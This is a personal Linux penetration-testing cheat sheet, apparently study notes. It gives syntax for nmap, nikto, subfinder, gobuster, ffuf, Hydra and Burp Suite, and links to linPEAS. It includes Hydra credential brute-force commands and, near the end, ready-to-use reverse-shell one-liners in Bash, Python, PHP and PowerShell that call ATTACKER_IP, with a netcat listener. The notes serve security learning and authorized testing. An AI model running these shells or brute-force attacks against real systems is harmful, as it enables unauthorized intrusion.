### Enumeration and Exploatation list of commands with description (LINUX)

**Ping** probes - testing connection to the target machine or URL

```bash
ping <options> <target>
-c <count> # number of ping requests to send. Ex. ping -c 5 10.10.10.10.Description:How many requests you want yo send
-i <seconds> # interval between each packet. Ex ping -i 0.5 10.10.10.10
-s <bytes> # packet size in bytes
```

Also you can ping url for example
```bash
ping google.com

```

**Nmap** scans main descriptions
By nmap you can scan ports , understand versions of the services runned in the target for more information
you can use a command:

```bash
nmap --help

```

main syntax:

```bash
nmap <options> <target>
```

Options:
```bash
nmap <target> # basic scan - checks what the most popular ports are open
-sS # TCP SYN scan , fast and common
-sT # also a TCP scan used when SYN scan isn't allowed
-sU # UDP
-p port,port # list of ports which you want to scan
-A # agressive scan you can detect OS, versions also includes script scanning, tracerouse
-sV # service version
-sC # run defoult scripts 
-Pn # skip ping probes
-v/-vv # verbose mode(more information about scanning)
-T<0-5> # set fast of scan where 0 is slow 5 fast
-oN output.txt # save scan results to a file
-p- # scan all ports 0-65000
-O # detect OS
```
**Examples** that I often use:
```bash
nmap -p- -T4 -v <target> # scans all ports || with fast speed , more information mode

```

```bash
nmap -p 22,80,139 -sCV <target> # scan only defined ports , run defoult scripts and detect versions

```


**Nikto** - Web server vulnerability scanner for more information nikto **--help**
Syntax:

```bash
nikto <option> <url>

```
**Example**

```bash
nikto -h google.com

```

**Subfinder** - Advanced subdomain enumeration for more information subfinder **--help** (**BugBounty**)
Syntax:

```bash
subfinder <option> <host>

```

**Example of host:**

```bash
google.com
```

**Example of command:**

```bash
subfinder -d google.com

```

**Gobuster** - Web directory brute-forcing for more information gobuster **--help**

**Syntax:**
```bash
gobuster [mode] -u <url> -w <wordlist> [options]
```

**DIR** mode useful options:

```bash
gobuster dir -u http://target.com -w /home/kali/common.txt -x php,html,txt -t 30
```

```bash
-u <url> # target url
-w <wordlist> # path to wordlist
-x <extensions> # add directory extensions
-t <threads> # number of threads for default 10
-s <status> # show only specific HTTP status codes
```




Also in **gobuster** exists different modes which i do not using 

Want to say about wordlists:
SecLists --- collection of usefull wordlists that can be used for brute-forcing , all types like passwords , subdomains,
url directories , SQLi 

**ffuf** - usually used for brute-forcing subdomains but also can be used for hidden url directories
For hidden directories:

```bash
ffuf -u http://target_host:8080/FUZZ -w /usr/share/wordlists/dirb/directory-list-2.3-medium.txt                  
```
**For subdomains:**

```bash
 ffuf -u http://target_host:8080/ -H "Host: FUZZ.target_host" -w /home/kali/wordlists/discovery/DNS/subdomains-top1million-20000.txt 
```
Options/Extensions

```bash
-u # target url
-w # wordlist(path to wordlist)
-fs <size> # filtering  by <size> (size of page)
-mc <status> # filtering  by <status> (status of page) ex. 200,301,500
-H <HOST> # define a host for fuzzing subdomains
FUZZ # point for fuzzing by choosen wordlist
```
**Hydra** is a high-performance CLI tool for credential brute-forcing across multiple protocols; its powerful, syntax-sensitive options demand precision.For more info **hydra -h**

Syntax:

```bash
hydra -l user -P passlist.txt ftp://192.168.0.1 # ftp brute-forcing only password

hydra -l admin -P /home/kali/wordlists/passwords/rockyou.txt target.host http-post-form \
"/login:name=^USER^&pass=^PASS^&form_id=user_login&op=Log+in:Invalid username or password" #login-form brute-force

hydra -L logins.txt -P pws.txt -M targets.txt ssh #shh user&password brute-force
```

Options:
```bash
-h # help
-l # const username without wordlist
-L # wordlist with usernames to brutte-force
-p # const password
-P # wordlist with password
-M # list of servers to attack
```
**Note**:Brute-forcing in the same time user and password not recomended.Also you must use **BurpSuite** to catch a login form and understand how to build **hydra command** considering the server error when you enter a bad username or password

```bash
hydra -l admin -P /home/kali/wordlists/passwords/rockyou.txt target.host http-post-form \
"/login:name=^USER^&pass=^PASS^&form_id=user_login&op=Log+in:Invalid username or password" #login-form brute-force
#name=^USER^ - brute force
#pass=^PASS^ - brute force
#Log+in - login form
#Invalid username or password - text of error after bad request
#http-post-form - POST also could be GET but as a rule in login forms POST 
#/login - path to login form after target host
#target.host - example.htb
```

**Note**: this syntax is not a rule for all login-forms brute-force it's depents of situation

**Burp Suite** is an integrated platform for web application security testing. It’s primarily used during penetration tests and internal audits to intercept, analyze, and modify HTTP/HTTPS traffic between your browser and the target server.

- **Proxy**  
  - Acts as an intercepting proxy server for all browser traffic.  
  - Lets you view and modify requests and responses “on the fly.”  
  - Serves as the foundation for discovering vulnerabilities (SQLi, XSS, etc.).

- **Intruder**  
  - Automates the delivery of customized payloads in bulk (fuzzing, brute-forcing, parameter manipulation).  
  - Supports attack modes like Sniper (single-parameter testing), Battering-ram (same payload across all positions), Pitchfork and Clusterbomb (multi-parameter combinations).  
  - Ideal for uncovering authentication flaws, business-logic issues, and parameter-handling bugs.

- **Repeater**  
  - Allows you to hand-craft and re-send individual HTTP requests.  
  - Keeps a history of edits and responses for easy comparison.  
  - Perfect for fine-tuning payloads and performing in-depth analysis of a specific request.
    
- **Other Tabs**  
  - Burp Suite also includes additional tabs (e.g., Scanner, Decoder, Comparer, Extender), but I rarely use them.  

Each tool complements the workflow: **Proxy** for initial interception and inspection, **Intruder** for automated attacks, and **Repeater** for meticulous manual testing.   

**Common Reverse-Shell One-Liners**

**Bash (native Linux)**  
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

**Python**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
**PHP (web-app environments)**

```bash
php -r '$s=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**PowerShell (Windows)**
```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=Invoke-Expression $d 2>&1 | Out-String ;$s.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r),0,$r.Length)};"`
```

> For more reverse shells, visit [https://www.revshells.com/](https://www.revshells.com/) and customize your netcat listener with the appropriate IP and PORT.

  
**Netcat Listener**

**Syntax:**
```bash
rlwrap nc -lvnp 4444 
```
**Note**When a reverse shell is started on the target machine, you must run your listener on the same port that the reverse shell connects to.

```bash
rlwrap 
```
enables arrow-key navigation and command-history in a reverse shell for convenience, and it does not affect the listener.

```bash
-l # Listen mode (wait for inbound connections)  
-v # Verbose output (show connection details)  
-n # Numeric-only addresses (no DNS lookup)  
-p # Port specification (followed by the port number)
# Combines in one flag -lvnp
```




Additionally, for privilege escalation and identifying attack vectors, tools like LinPeas (for Linux) and WinPeas (for Windows) are often used; you need to upload them to the target system and execute them.
**LINK**    [linPEAS on GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)


















